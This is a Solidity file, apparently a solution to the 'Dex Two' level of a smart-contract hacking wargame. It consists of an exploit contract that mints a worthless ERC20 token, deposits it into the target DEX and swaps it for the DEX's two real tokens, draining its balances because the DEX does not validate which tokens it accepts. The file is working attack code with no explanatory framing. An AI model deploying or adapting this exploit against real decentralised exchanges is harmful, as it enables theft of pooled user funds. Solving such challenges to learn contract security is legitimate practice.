// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "hardhat/console.sol";

contract DexTwoToken is ERC20 {
  constructor(string memory name, string memory symbol) ERC20(name, symbol) {
    _mint(msg.sender, 100000);
  }
}

abstract contract IDexTwo {
  address public token1;
  address public token2;

  function swap(address from, address to, uint256 amount) external virtual;

  function balanceOf(
    address token,
    address account
  ) public view virtual returns (uint);

  function approve(address spender, uint amount) public virtual;
}

contract DexTwoAttack {
  IDexTwo public dexTwo;
  IERC20 public dexTwoToken;

  constructor(address _dexTwo) {
    dexTwo = IDexTwo(_dexTwo);
    dexTwoToken = new DexTwoToken("dexTwoToken", "dex2");
  }

  function attack() public {
    dexTwoToken.transfer(address(dexTwo), 100);
    dexTwoToken.approve(address(dexTwo), 1000);
    dexTwo.approve(address(this), 1000);

    dexTwo.swap(address(dexTwoToken), address(dexTwo.token1()), 100);
    console.log(
      "dexTwo token1 balance",
      IERC20(dexTwo.token1()).balanceOf(address(dexTwo))
    );

    dexTwo.swap(address(dexTwoToken), address(dexTwo.token2()), 200);
    console.log(
      "dexTwo token2 balance",
      IERC20(dexTwo.token2()).balanceOf(address(dexTwo))
    );
  }
}
